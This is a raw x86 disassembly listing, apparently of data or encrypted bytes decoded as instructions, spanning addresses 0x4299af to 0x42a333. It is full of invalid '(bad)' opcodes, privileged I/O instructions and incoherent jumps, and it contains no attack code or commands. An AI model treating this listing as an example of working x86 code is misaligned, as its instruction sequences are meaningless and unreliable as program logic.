  4299af:	stos   BYTE PTR es:[edi],al
  4299b0:	pusha  
  4299b1:	mov    BYTE PTR [esi],bh
  4299b3:	xor    ch,bh
  4299b5:	cmp    eax,0xa66f973b
  4299ba:	or     dh,BYTE PTR [edi]
  4299bc:	out    dx,al
  4299bd:	setbe  BYTE PTR [eax]
  4299c0:	mov    eax,ds:0x827b4cde
  4299c5:	pop    ebp
  4299c6:	imul   eax,DWORD PTR [edi+0x7ef77bb9],0xffffff89
  4299cd:	ds ins DWORD PTR es:[edi],dx
  4299cf:	jl     0x429956
  4299d1:	xlat   BYTE PTR ds:[ebx]
  4299d2:	push   es
  4299d3:	test   BYTE PTR [ebx],dh
  4299d5:	inc    esp
  4299d6:	outs   dx,DWORD PTR ds:[esi]
  4299d7:	and    bl,BYTE PTR [edi+ebx*1-0x70]
  4299db:	cmc    
  4299dc:	dec    edi
  4299dd:	popf   
  4299de:	or     esp,DWORD PTR [esp+ebp*8]
  4299e1:	pop    esi
  4299e2:	dec    edx
  4299e3:	mov    ch,0xb6
  4299e5:	xor    ah,ch
  4299e7:	ret    0x6291
  4299ea:	adc    BYTE PTR [ecx+0x11],dh
  4299ed:	or     esp,DWORD PTR [eax]
  4299ef:	sti    
  4299f0:	push   ebx
  4299f1:	jns    0x4299cd
  4299f3:	inc    eax
  4299f4:	fild   QWORD PTR [edx+0x77]
  4299f7:	lds    esi,FWORD PTR [edi]
  4299f9:	es (bad) 
  4299fb:	cmp    eax,0x85352deb
  429a00:	lods   eax,DWORD PTR ds:[esi]
  429a01:	(bad)  
  429a03:	sar    al,cl
  429a05:	inc    esi
  429a06:	xchg   ebp,eax
  429a07:	dec    ebp
  429a08:	adc    DWORD PTR [ebx+edi*8],esi
  429a0b:	scas   al,BYTE PTR es:[edi]
  429a0c:	pop    es
  429a0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429a0e:	add    DWORD PTR [ebp+edx*2-0x1e894b53],edx
  429a15:	gs xor al,0x35
  429a18:	mov    edx,ecx
  429a1a:	jbe    0x4299fc
  429a1c:	ficomp DWORD PTR [esi]
  429a1e:	lock push esi
  429a20:	jg     0x429a48
  429a22:	sub    esp,DWORD PTR [edi]
  429a24:	xor    BYTE PTR [esp+ecx*4],0xb5
  429a28:	rcr    DWORD PTR [ecx],1
  429a2a:	cmp    al,0x17
  429a2c:	lea    esp,cs:[eax]
  429a2f:	(bad)  
  429a30:	call   0xbcb59d8b
  429a35:	add    ecx,eax
  429a37:	inc    edx
  429a38:	je     0x4299e3
  429a3a:	jo     0x4299d5
  429a3c:	pushf  
  429a3d:	mov    bh,BYTE PTR [edi+edi*8+0x7c]
  429a41:	mov    esi,0x5c8c524f
  429a46:	mov    ch,0x55
  429a48:	dec    edi
  429a49:	(bad)  
  429a4a:	(bad)  
  429a4b:	stc    
  429a4c:	and    DWORD PTR [edx+eax*1-0x4e],ecx
  429a50:	lock xchg esi,eax
  429a52:	imul   edx,DWORD PTR [eax],0x51
  429a55:	fs dec edx
  429a57:	inc    edi
  429a58:	add    DWORD PTR [edx+0x5],ebp
  429a5b:	outs   dx,BYTE PTR ds:[esi]
  429a5c:	test   al,0x8d
  429a5e:	test   eax,0x8fabf301
  429a63:	pop    es
  429a64:	mov    eax,ds:0xe30e9f80
  429a69:	shl    DWORD PTR [ebp-0x28],cl
  429a6c:	fiadd  WORD PTR [edi+0x7e]
  429a6f:	and    eax,0xd61fc2c3
  429a74:	in     al,dx
  429a75:	push   cs
  429a76:	fmul   DWORD PTR [edi+0x237e9989]
  429a7c:	adc    bh,bl
  429a7e:	mov    dh,0xd1
  429a80:	pop    ss
  429a81:	mov    cl,0x17
  429a83:	icebp  
  429a84:	(bad)  
  429a85:	cli    
  429a86:	ss (bad) 
  429a8a:	nop
  429a8b:	jge    0x429acd
  429a8d:	dec    ebx
  429a8e:	out    dx,eax
  429a8f:	mov    eax,ds:0xd1
	...
  429af4:	into   
  429af5:	std    
  429af6:	sti    
  429af7:	leave  
  429af8:	sti    
  429af9:	iret   
  429afa:	(bad)  
  429afb:	jmp    DWORD PTR ds:0x3fa95667
  429b01:	mov    ds:0xbe64293b,eax
  429b06:	add    DWORD PTR [eax],eax
  429b08:	add    eax,0xf1000001
  429b0d:	inc    esi
  429b0e:	jmp    0x429b7e
  429b10:	lahf   
  429b11:	cmp    eax,0x126bdc4f
  429b16:	jl     0x429b8e
  429b18:	dec    edi
  429b19:	out    0x75,al
  429b1b:	scas   al,BYTE PTR es:[edi]
  429b1c:	stos   DWORD PTR es:[edi],eax
  429b1d:	jns    0x429aeb
  429b1f:	cld    
  429b20:	dec    edi
  429b21:	adc    DWORD PTR [eax],0xffffff9e
  429b24:	add    bl,BYTE PTR [ecx+ecx*2-0xdf49061]
  429b2b:	mov    ?,WORD PTR [edi+0x8]
  429b2e:	sub    eax,0xe1f1c6a5
  429b33:	push   esp
  429b34:	outs   dx,DWORD PTR ds:[esi]
  429b35:	xchg   ecx,eax
  429b36:	and    al,0x70
  429b38:	jae    0x429b52
  429b3a:	jo     0x429b1b
  429b3c:	xchg   ebx,eax
  429b3d:	ret    0x9045
  429b40:	lods   eax,DWORD PTR ds:[esi]
  429b41:	rcr    BYTE PTR [edx-0x64],1
  429b44:	sbb    eax,0x4a755206
  429b49:	xor    esi,DWORD PTR [ebx+0x74dd4ce]
  429b4f:	jle    0x429b70
  429b51:	or     cl,dh
  429b53:	jge    0x429b54
  429b55:	dec    esp
  429b56:	add    BYTE PTR [edx+0x6569c667],bh
  429b5c:	add    DWORD PTR [ecx-0x5f902a21],ebp
  429b62:	jle    0x429afa
  429b64:	push   esi
  429b65:	(bad)  
  429b66:	xchg   ecx,eax
  429b67:	cs dec ecx
  429b69:	es jp  0x429b9f
  429b6c:	cmp    DWORD PTR [edx+edx*4],esi
  429b6f:	in     al,0xe9
  429b71:	test   eax,0xd7500128
  429b76:	mov    ch,0x8e
  429b78:	sti    
  429b79:	inc    eax
  429b7a:	in     al,dx
  429b7b:	rcr    edi,0x17
  429b7e:	repz jne 0x429b8a
  429b81:	jne    0x429b8d
  429b83:	cwde   
  429b84:	pop    eax
  429b85:	bound  ebx,QWORD PTR [ebx]
  429b87:	in     eax,0x19
  429b89:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429b8b:	xlat   BYTE PTR ds:[ebx]
  429b8c:	or     DWORD PTR [edi-0x48bdea67],eax
  429b92:	out    dx,al
  429b93:	frstor [esi+0x46]
  429b96:	pop    ss
  429b97:	(bad)  
  429b98:	jo     0x429bc0
  429b9a:	push   cs
  429b9b:	idiv   eax
  429b9d:	pop    es
  429b9e:	xchg   ebx,eax
  429b9f:	dec    esp
  429ba0:	mov    DWORD PTR [eax],esi
  429ba2:	mov    eax,0x96986420
  429ba7:	ds test edi,ebp
  429baa:	lds    esp,FWORD PTR [esi]
  429bac:	cmp    al,0x1f
  429bae:	push   0xd9526385
  429bb3:	xchg   edi,eax
  429bb4:	dec    esi
  429bb5:	push   ss
  429bb6:	inc    eax
  429bb7:	outs   dx,BYTE PTR ds:[esi]
  429bb8:	xchg   ebx,eax
  429bb9:	pusha  
  429bba:	icebp  
  429bbb:	lock (bad) 
  429bbd:	aam    0x83
  429bbf:	push   cs
  429bc0:	int3   
  429bc1:	mov    ebx,0x276794b3
  429bc6:	jmp    0x429c03
  429bc8:	fcmovnbe st,st(4)
  429bca:	sub    dl,BYTE PTR [edi]
  429bcc:	mov    edi,0xa930e872
  429bd1:	stos   DWORD PTR es:[edi],eax
  429bd2:	icebp  
  429bd3:	push   edi
  429bd4:	jp     0x429c00
  429bd6:	jg     0x429b9b
  429bd8:	or     bh,BYTE PTR [ebp+0x6ef5ebae]
  429bde:	mov    esp,0x111c8ca9
  429be3:	(bad)
  429be6:	and    edx,DWORD PTR [ecx-0x48765841]
  429bec:	stc    
  429bed:	pop    ds
  429bee:	ds adc eax,0x30761b04
  429bf4:	arpl   WORD PTR [edx-0x25],di
  429bf7:	push   ebx
  429bf8:	into   
  429bf9:	sub    dh,BYTE PTR [ebp-0x19d7bc33]
  429bff:	sub    esi,ebp
  429c01:	ss hlt 
  429c03:	and    esp,DWORD PTR [ecx-0x76fb90b4]
  429c09:	sbb    al,0xe1
  429c0b:	xchg   esp,eax
  429c0c:	data16 sub dh,BYTE PTR [edx]
  429c0f:	jne    0x429c0b
	...
  429c71:	add    BYTE PTR [eax],al
  429c73:	add    BYTE PTR [ebx-0x487759ea],ah
  429c79:	mov    eax,0x89413faf
  429c7e:	(bad)  
  429c7f:	xor    BYTE PTR [ebx+0x69a97479],bl
  429c85:	mov    edi,0x1050001
  429c8a:	add    BYTE PTR [eax],al
  429c8c:	jae    0x429c13
  429c8e:	aaa    
  429c8f:	and    DWORD PTR [ebx+edi*1-0x75],ebp
  429c93:	cld    
  429c94:	inc    esi
  429c95:	repnz dec ebp
  429c97:	ins    BYTE PTR es:[edi],dx
  429c98:	out    dx,al
  429c99:	out    dx,eax
  429c9a:	cmp    al,0xc
  429c9c:	sahf   
  429c9d:	loop   0x429c86
  429c9f:	pop    esi
  429ca0:	jbe    0x429cfc
  429ca2:	icebp  
  429ca3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429ca4:	pop    ebp
  429ca5:	outs   dx,BYTE PTR ds:[esi]
  429ca6:	fisttp WORD PTR [ecx-0x80]
  429ca9:	icebp  
  429caa:	sub    edx,esi
  429cac:	inc    ebp
  429cad:	add    ch,BYTE PTR [edi+0x64]
  429cb0:	inc    ebp
  429cb1:	and    bl,BYTE PTR [ebp+ebp*8-0x19]
  429cb5:	ds pusha 
  429cb7:	xor    BYTE PTR [eax-0x4f709de6],dh
  429cbd:	ficom  WORD PTR [ecx-0x39]
  429cc0:	fnstsw WORD PTR [edx+0x588cbcce]
  429cc6:	sub    BYTE PTR [ebp+0x25a59099],al
  429ccc:	jge    0x429cdb
  429cce:	aad    0x9a
  429cd0:	ficom  WORD PTR [eax]
  429cd2:	fcom   st(2)
  429cd4:	into   
  429cd5:	stos   DWORD PTR es:[edi],eax
  429cd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429cd7:	leave  
  429cd8:	icebp  
  429cd9:	mov    ch,0xb5
  429cdb:	ja     0x429c97
  429cdd:	bound  edi,QWORD PTR [esi+0x5f]
  429ce0:	push   es
  429ce1:	xchg   ecx,eax
  429ce2:	sar    BYTE PTR [eax-0x79],0x7f
  429ce6:	fistp  WORD PTR [edx]
  429ce8:	and    dh,0x8f
  429ceb:	xchg   ebp,eax
  429cec:	sbb    eax,0xc15abc17
  429cf1:	stos   BYTE PTR es:[edi],al
  429cf2:	jl     0x429cb0
  429cf4:	popa   
  429cf5:	repz in eax,0x91
  429cf8:	mov    ds:0xc170f15f,eax
  429cfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429cfe:	rol    BYTE PTR [edi-0x5],0x4f
  429d02:	fsub   QWORD PTR [ebp+0x1778fe80]
  429d08:	xor    ch,BYTE PTR [esi]
  429d0a:	mov    esi,0x866b070e
  429d0f:	mov    ebp,0x35d76b60
  429d14:	push   0x8d735e25
  429d19:	hlt    
  429d1a:	dec    ecx
  429d1b:	int    0x40
  429d1d:	or     eax,0x9ed1a5cd
  429d22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429d23:	push   ebx
  429d24:	int3   
  429d25:	jmp    0x429d6c
  429d27:	es mov bl,0x3b
  429d2a:	cmp    eax,0xfd4d02ca
  429d2f:	dec    edi
  429d30:	add    eax,DWORD PTR [edi]
  429d32:	push   0x53
  429d34:	int3   
  429d35:	jg     0x429d56
  429d37:	fisub  WORD PTR [eax-0x3a]
  429d3a:	sti    
  429d3b:	and    BYTE PTR [esi+0x4c],ah
  429d3e:	jmp    0xeaeb14bb
  429d43:	gs cmc 
  429d45:	and    DWORD PTR [edi+0xac7230f],esp
  429d4b:	xor    al,0x9
  429d4d:	mov    DWORD PTR [eax-0x3c9e7e03],edx
  429d53:	dec    edx
  429d54:	aas    
  429d55:	mov    DWORD PTR [esi],esi
  429d57:	jmp    0x71ce0db9
  429d5c:	cmp    al,0xba
  429d5e:	dec    edi
  429d5f:	cmc    
  429d60:	jmp    0x429d43
  429d62:	push   es
  429d63:	pop    es
  429d64:	mov    al,ds:0x59843ea
  429d69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429d6a:	xchg   ebx,eax
  429d6b:	dec    eax
  429d6c:	fst    QWORD PTR [ebp+0x5]
  429d6f:	inc    edi
  429d70:	sahf   
  429d71:	ins    BYTE PTR es:[edi],dx
  429d72:	jne    0x429d52
  429d74:	inc    eax
  429d75:	or     eax,0x53b38d4
  429d7a:	pop    esp
  429d7b:	ds jns 0x429d33
  429d7e:	push   ebx
  429d7f:	adc    eax,0x8618eba4
  429d84:	push   cs
  429d85:	inc    esi
  429d86:	lods   eax,DWORD PTR ds:[esi]
  429d87:	inc    eax
  429d88:	sti    
  429d89:	pusha  
  429d8a:	jmp    0x429d53
  429d8c:	not    DWORD PTR [ebx-0x51]
  429d8f:	pop    ecx
  429d90:	jbe    0x429d92
	...
  429df2:	add    BYTE PTR [eax],al
  429df4:	fwait
  429df5:	mov    bh,0xc4
  429df7:	or     al,0xec
  429df9:	jg     0x429dd6
  429dfb:	mov    bh,0xe1
  429dfd:	sahf   
  429dfe:	loop   0x429e68
  429e00:	push   ss
  429e01:	or     DWORD PTR [eax],ecx
  429e03:	aam    0x6e
  429e05:	rol    BYTE PTR [ecx],0x0
  429e08:	add    eax,0x2f000001
  429e0d:	out    dx,al
  429e0e:	ins    DWORD PTR es:[edi],dx
  429e0f:	pop    ss
  429e10:	jnp    0x429e4c
  429e12:	jnp    0x429e31
  429e14:	mov    al,ds:0xed54e240
  429e19:	pop    eax
  429e1a:	jle    0x429e1d
  429e1c:	pusha  
  429e1d:	sub    BYTE PTR gs:[edx+0x22],ah
  429e21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429e22:	inc    ebx
  429e23:	xchg   edi,eax
  429e24:	es cbw 
  429e27:	xchg   esp,eax
  429e28:	js     0x429df8
  429e2a:	mov    esp,0xef2314c4
  429e2f:	test   edx,edi
  429e31:	jl     0x429ea4
  429e33:	int    0x34
  429e35:	cwde   
  429e36:	scas   al,BYTE PTR es:[edi]
  429e37:	push   edi
  429e38:	or     dh,dl
  429e3a:	sub    al,0xf9
  429e3c:	mov    cl,0x20
  429e3e:	div    DWORD PTR [ebx+ecx*1-0x3e79377f]
  429e45:	(bad)  
  429e46:	mov    dh,0x9c
  429e48:	inc    esi
  429e49:	and    BYTE PTR [edi-0x3d89209c],ah
  429e4f:	push   eax
  429e50:	xor    DWORD PTR [eax],esi
  429e52:	das    
  429e53:	pop    ecx
  429e54:	shl    BYTE PTR [ecx+0x5aadb768],0xab
  429e5b:	mov    edi,edi
  429e5d:	popa   
  429e5e:	jmp    0xb029:0x491c18fa
  429e65:	ret    
  429e66:	ror    DWORD PTR [eax+0x2cdf0896],cl
  429e6c:	loope  0x429dfc
  429e6e:	call   0xf1cc:0x198eb3bd
  429e75:	retf   0xa583
  429e78:	int3   
  429e79:	push   esi
  429e7a:	sbb    eax,0xe200c7b1
  429e7f:	ret    
  429e80:	push   edi
  429e81:	ret    0x3a5f
  429e84:	pusha  
  429e85:	sahf   
  429e86:	pop    ebx
  429e87:	adc    BYTE PTR [eax+eax*2],dl
  429e8a:	repz add eax,0xe2dc7eff
  429e90:	(bad)  
  429e91:	mov    ch,BYTE PTR [edx+ebp*4]
  429e94:	rol    eax,0xea
  429e97:	cmp    dh,dl
  429e99:	out    0xe2,al
  429e9b:	test   DWORD PTR [ecx],esi
  429e9d:	push   ss
  429e9e:	add    ebx,DWORD PTR ds:[esi]
  429ea1:	inc    ebx
  429ea2:	out    dx,eax
  429ea3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429ea4:	(bad)  
  429ea5:	ja     0x429f25
  429ea7:	outs   dx,BYTE PTR ds:[esi]
  429ea8:	push   esi
  429ea9:	push   es
  429eaa:	lods   al,BYTE PTR ds:[esi]
  429eab:	out    0x8c,eax
  429ead:	outs   dx,DWORD PTR ds:[esi]
  429eae:	repz std 
  429eb0:	sahf   
  429eb1:	cld    
  429eb2:	mov    eax,0xac3e37b2
  429eb7:	es mov eax,0x49f2bc76
  429ebd:	(bad)  
  429ebe:	out    dx,eax
  429ebf:	mov    ch,0x62
  429ec1:	not    DWORD PTR [esi-0x606022c6]
  429ec7:	imul   dh
  429ec9:	outs   dx,BYTE PTR ds:[esi]
  429eca:	pop    ds
  429ecb:	ja     0x429e6c
  429ecd:	mov    edi,0xcfb6d1e9
  429ed2:	dec    edi
  429ed3:	(bad)  
  429ed4:	push   ebp
  429ed5:	fild   QWORD PTR [edx+0x5f]
  429ed8:	fdiv   QWORD PTR [ebx]
  429eda:	sbb    DWORD PTR [eax],ebp
  429edc:	stos   DWORD PTR es:[edi],eax
  429edd:	data16 ja 0x429efe
  429ee0:	sub    dl,BYTE PTR [ecx]
  429ee2:	sahf   
  429ee3:	fsubr  QWORD PTR [esi]
  429ee5:	mov    bl,0x0
  429ee7:	mov    al,0x7b
  429ee9:	sar    DWORD PTR ds:0x702eaba4,1
  429eef:	ds pop ss
  429ef1:	das    
  429ef2:	psubd  mm6,QWORD PTR [ebx]
  429ef5:	fist   DWORD PTR [esi+0x6286eeae]
  429efb:	mov    dl,0x4f
  429efd:	lods   eax,DWORD PTR ds:[esi]
  429efe:	xchg   edx,eax
  429eff:	rol    DWORD PTR [eax+ecx*4-0x33],1
  429f03:	in     eax,0x95
  429f05:	in     eax,dx
  429f06:	pop    ds
  429f07:	pop    esi
  429f08:	xchg   BYTE PTR [eax+edi*1-0x5b],ch
  429f0c:	aaa    
  429f0d:	sbb    DWORD PTR [ebx+0x3c],edi
  429f10:	or     DWORD PTR [eax],eax
	...
  429f72:	add    BYTE PTR [eax],al
  429f74:	xor    DWORD PTR [ebp-0x38],eax
  429f77:	push   es
  429f78:	cld    
  429f79:	(bad)  
  429f7a:	push   DWORD PTR [edi-0x50]
  429f7d:	cld    
  429f7e:	sbb    esp,DWORD PTR [ebx+0x2bc16986]
  429f84:	jae    0x429f47
  429f86:	add    DWORD PTR [eax],eax
  429f88:	add    eax,0xbc000001
  429f8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429f8e:	retf   0xa397
  429f91:	call   0x842f:0x7b1ba9e9
  429f98:	sub    DWORD PTR [esi-0x5ea01f25],esp
  429f9e:	idiv   BYTE PTR [eax-0xef20c12]
  429fa4:	mov    al,0xd4
  429fa6:	rcl    BYTE PTR [ebx],1
  429fa8:	mov    bl,0x8a
  429faa:	dec    esp
  429fab:	mov    ecx,0xdc3d1506
  429fb0:	add    BYTE PTR [ebx+0x1208fe46],cl
  429fb6:	adc    ebx,edx
  429fb8:	xchg   ecx,eax
  429fb9:	test   DWORD PTR [edi],edi
  429fbb:	mov    ch,0x49
  429fbd:	and    BYTE PTR [edi+eiz*1],0x27
  429fc1:	push   eax
  429fc2:	hlt    
  429fc3:	mov    edi,0x3649274b
  429fc8:	xor    BYTE PTR [esi-0x59],bh
  429fcb:	loopne 0x429f50
  429fcd:	inc    ecx
  429fce:	sub    eax,ecx
  429fd0:	stos   BYTE PTR es:[edi],al
  429fd1:	shufps xmm4,XMMWORD PTR [edx],0x2b
  429fd5:	push   eax
  429fd6:	push   0x26c02625
  429fdb:	hlt    
  429fdc:	mov    cl,0x7e
  429fde:	leave  
  429fdf:	pop    edx
  429fe0:	inc    ecx
  429fe2:	push   cs
  429fe3:	mov    esp,0xa953312a
  429fe8:	and    ebx,edx
  429fea:	mov    bl,0x4c
  429fec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429fed:	jno    0x429fb3
  429fef:	sar    DWORD PTR [eax],1
  429ff1:	push   ecx
  429ff2:	in     al,dx
  429ff3:	ins    BYTE PTR es:[edi],dx
  429ff4:	jmp    0xbfec:0x995fe6ed
  429ffb:	sbb    DWORD PTR ds:0x11839f35,0x5
  42a002:	mov    esi,0x2b01543d
  42a007:	inc    edx
  42a008:	arpl   WORD PTR [edx+0x59088fd4],dx
  42a00e:	push   es
  42a00f:	push   esp
  42a010:	ins    BYTE PTR es:[edi],dx
  42a011:	rol    DWORD PTR [ecx],1
  42a013:	je     0x429fb1
  42a015:	popf   
  42a016:	sti    
  42a017:	in     eax,dx
  42a018:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a019:	cwde   
  42a01a:	aam    0xf0
  42a01c:	pop    eax
  42a01d:	sub    al,0xa5
  42a01f:	gs or  eax,0xd4c9c323
  42a025:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a026:	test   eax,0xf962b0bb
  42a02b:	addr16 xchg dh,dh
  42a02e:	push   ebx
  42a02f:	retf   0xf065
  42a032:	and    esi,DWORD PTR [ecx+0x1669632a]
  42a038:	ficomp DWORD PTR [ebp+edi*1+0x7b]
  42a03c:	mov    ecx,0xe5ddc872
  42a041:	add    al,0xa
  42a043:	push   es
  42a044:	and    DWORD PTR [ecx+0x1d],edi
  42a047:	dec    edi
  42a048:	in     al,dx
  42a049:	icebp  
  42a04a:	xor    BYTE PTR [ebx],bh
  42a04c:	fsubr  st,st(1)
  42a04e:	xchg   DWORD PTR [esi-0x32fe8da5],ebx
  42a054:	cmp    ah,BYTE PTR [eax]
  42a056:	sahf   
  42a057:	es stc 
  42a059:	js     0x42a039
  42a05b:	stos   DWORD PTR es:[edi],eax
  42a05c:	or     eax,0x382ea1f1
  42a061:	add    edx,ebx
  42a063:	push   ds
  42a064:	in     eax,0xdf
  42a066:	aaa    
  42a067:	stc    
  42a068:	mov    ebx,0x6c9d668b
  42a06d:	mov    ?,WORD PTR [edx]
  42a06f:	adc    al,0xa9
  42a071:	sbb    al,0xc8
  42a073:	sbb    al,0x72
  42a075:	jmp    0xe680e81d
  42a07a:	mov    edx,0x62bd1faa
  42a07f:	(bad)  
  42a080:	mov    esp,0xadf7017a
  42a085:	lds    ebx,FWORD PTR [edi-0x6c]
  42a088:	shr    BYTE PTR [ebx-0x63],1
  42a08b:	add    edi,DWORD PTR [ecx+0x9]
  42a08e:	sub    eax,0x30ef
	...
  42a0f3:	add    bh,dl
  42a0f5:	pushf  
  42a0f6:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a0fd:	call   FWORD PTR [ebx]
  42a0ff:	(bad)  
  42a100:	pop    esp
  42a101:	xchg   ebx,eax
  42a102:	xor    al,0x35
  42a104:	js     0x42a0c8
  42a106:	add    DWORD PTR [eax],eax
  42a108:	add    eax,0xb3000001
  42a10d:	jno    0x42a163
  42a10f:	call   0xe71df85b
  42a114:	fstp   QWORD PTR [ecx-0x5e]
  42a117:	jbe    0x42a166
  42a119:	addr16 xchg ch,ch
  42a11c:	adc    al,BYTE PTR [ecx]
  42a11e:	test   DWORD PTR [edx+ecx*4+0x6d],0x358a1eb7
  42a126:	lods   eax,DWORD PTR ds:[esi]
  42a127:	and    al,0x18
  42a129:	jns    0x42a0b9
  42a12b:	aam    0xc7
  42a12d:	cld    
  42a12e:	push   edi
  42a12f:	or     eax,ebx
  42a131:	call   0x35309517
  42a136:	leave  
  42a137:	mov    edi,0x72b96003
  42a13c:	push   ds
  42a13d:	cmp    al,0x52
  42a13f:	outs   dx,DWORD PTR es:[esi]
  42a141:	repz or BYTE PTR [ebp-0x6b],dl
  42a145:	jl     0x42a115
  42a147:	test   DWORD PTR [eax+0x27],ebp
  42a14a:	inc    esp
  42a14b:	xchg   BYTE PTR [ecx+0x79],dl
  42a14e:	add    BYTE PTR [edx],bh
  42a150:	jle    0x42a13b
  42a152:	inc    esp
  42a153:	push   esp
  42a154:	outs   dx,BYTE PTR ds:[esi]
  42a155:	test   DWORD PTR ds:0xe440b58,ebx
  42a15b:	lock adc BYTE PTR [esi],cl
  42a15e:	call   0xee2f:0x88330372
  42a165:	mov    eax,ds:0xaf4da18a
  42a16a:	inc    edx
  42a16b:	outs   dx,BYTE PTR ds:[esi]
  42a16c:	mov    esp,DWORD PTR [esi+eiz*4]
  42a16f:	test   dl,ch
  42a171:	sbb    ebp,edx
  42a173:	cmp    ah,bh
  42a175:	call   0xbac4:0x15799d63
  42a17c:	hlt    
  42a17d:	cmp    eax,0xe371973c
  42a182:	mov    ds:0x22d457a6,eax
  42a187:	push   edi
  42a188:	xchg   BYTE PTR [edx+0x43],dh
  42a18b:	popa   
  42a18c:	pusha  
  42a18d:	enter  0x5e76,0xbf
  42a191:	(bad)  
  42a192:	cdq    
  42a193:	pop    edx
  42a194:	pop    edi
  42a195:	iret   
  42a196:	push   cs
  42a197:	into   
  42a198:	daa    
  42a199:	jge    0x42a188
  42a19b:	sub    ch,BYTE PTR ds:0x6627901a
  42a1a1:	lods   eax,DWORD PTR ds:[esi]
  42a1a2:	cdq    
  42a1a3:	bound  ebx,QWORD PTR [ecx+0x6cefb62e]
  42a1a9:	les    ebp,FWORD PTR [esi+0x44]
  42a1ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a1ad:	repz mov ds:0x97c4c86a,eax
  42a1b3:	inc    edi
  42a1b4:	or     eax,0x99fb0757
  42a1b9:	mov    al,ds:0xda202db
  42a1be:	cmp    edi,edx
  42a1c0:	jle    0x42a239
  42a1c2:	adc    esi,DWORD PTR [eax]
  42a1c4:	stos   DWORD PTR es:[edi],eax
  42a1c5:	sahf   
  42a1c6:	aad    0xd3
  42a1c8:	and    eax,0xe4db89f6
  42a1cd:	cmp    DWORD PTR ds:0x1679ae94,0xa5b0889f
  42a1d7:	fnstsw ax
  42a1d9:	pop    esp
  42a1da:	cmp    al,0x67
  42a1dc:	mov    dl,0x35
  42a1de:	sbb    eax,DWORD PTR [ebp+0x1d]
  42a1e1:	xchg   esi,eax
  42a1e2:	xchg   edx,eax
  42a1e3:	sbb    dh,cl
  42a1e5:	cmp    al,0x23
  42a1e7:	les    edi,FWORD PTR [eax-0x602f1187]
  42a1ed:	or     BYTE PTR [ebp-0x35],0x2a
  42a1f1:	jne    0x42a1d3
  42a1f3:	ss aam 0x4
  42a1f6:	adc    DWORD PTR [esi+0x1e562803],edx
  42a1fc:	sbb    DWORD PTR ds:0xa8448148,eax
  42a202:	in     al,dx
  42a203:	push   esi
  42a204:	outs   dx,DWORD PTR ds:[esi]
  42a205:	or     BYTE PTR [esi-0x31008fee],dh
  42a20b:	inc    ebp
  42a20c:	les    ebx,FWORD PTR [ebx+0x56e7ab]
	...
  42a272:	add    BYTE PTR [eax],al
  42a274:	sub    eax,DWORD PTR [ebp+0x19bf1995]
  42a27a:	scas   eax,DWORD PTR es:[edi]
  42a27b:	mov    bh,0x1a
  42a27d:	aas    
  42a27e:	scas   al,BYTE PTR es:[edi]
  42a27f:	fst    DWORD PTR [esi+edi*1]
  42a282:	and    esi,esp
  42a284:	jge    0x42a249
  42a286:	add    DWORD PTR [eax],eax
  42a288:	add    eax,0xa7000001
  42a28d:	mov    ds:0x6dcd827a,eax
  42a292:	mov    edx,DWORD PTR [eax]
  42a294:	mov    cl,0x8b
  42a296:	loopne 0x42a287
  42a298:	jge    0x42a23d
  42a29a:	in     al,dx
  42a29b:	bound  ecx,QWORD PTR [ebx+0x31]
  42a29e:	rol    BYTE PTR [ebx-0x43],1
  42a2a1:	(bad)  
  42a2a2:	xor    ch,BYTE PTR [ebx-0x7f07a587]
  42a2a8:	inc    esi
  42a2a9:	jge    0x42a233
  42a2ab:	mov    ch,dl
  42a2ad:	and    ah,BYTE PTR [edi]
  42a2af:	in     eax,dx
  42a2b0:	sub    BYTE PTR [esi+0x46],dh
  42a2b3:	nop
  42a2b4:	sti    
  42a2b5:	mov    BYTE PTR [eax+0x2e],0xa4
  42a2b9:	adc    DWORD PTR [edi],esi
  42a2bb:	std    
  42a2bc:	daa    
  42a2bd:	sbb    esi,DWORD PTR [edx+0x27]
  42a2c0:	out    0xb6,eax
  42a2c2:	push   esp
  42a2c3:	pusha  
  42a2c4:	mov    ds:0x729dbd3d,eax
  42a2c9:	mov    eax,ds:0xa384511a
  42a2ce:	test   esi,esi
  42a2d0:	pop    eax
  42a2d1:	pop    ebx
  42a2d2:	fwait
  42a2d3:	cdq    
  42a2d4:	pop    edi
  42a2d5:	push   esi
  42a2d6:	ja     0x42a319
  42a2d8:	sub    al,0xe4
  42a2da:	pop    edx
  42a2db:	push   ebx
  42a2dc:	out    0x79,al
  42a2de:	(bad)  
  42a2df:	and    DWORD PTR [ebx-0x44],ebx
  42a2e2:	jg     0x42a349
  42a2e4:	xchg   edi,eax
  42a2e5:	mov    WORD PTR ds:0xdc548601,cs
  42a2eb:	adc    eax,0xfa887785
  42a2f0:	cs test eax,0xc87fa8f8
  42a2f6:	aaa    
  42a2f7:	ret    
  42a2f8:	imul   ebx,DWORD PTR [ebp-0x5a839aec],0x27
  42a2ff:	outs   dx,DWORD PTR ds:[esi]
  42a300:	mov    WORD PTR [ebp-0x56],?
  42a303:	pop    ebx
  42a304:	aad    0x37
  42a306:	pop    edx
  42a307:	ret    0x83e2
  42a30a:	in     eax,dx
  42a30b:	add    ch,bh
  42a30d:	aaa    
  42a30e:	xor    al,0x26
  42a310:	fdiv   DWORD PTR [edi]
  42a312:	dec    ebp
  42a313:	fwait
  42a314:	mov    BYTE PTR [esi],dh
  42a316:	scas   al,BYTE PTR es:[edi]
  42a317:	add    esi,0x8228744b
  42a31d:	loop   0x42a2fc
  42a31f:	mov    esp,0x1b209393
  42a324:	pop    es
  42a325:	sbb    al,BYTE PTR [esi-0x51f64125]
  42a32b:	pop    ebp
  42a32c:	and    cl,bh
  42a32e:	mov    ebp,0x8488b9ac
  42a333:	popa   
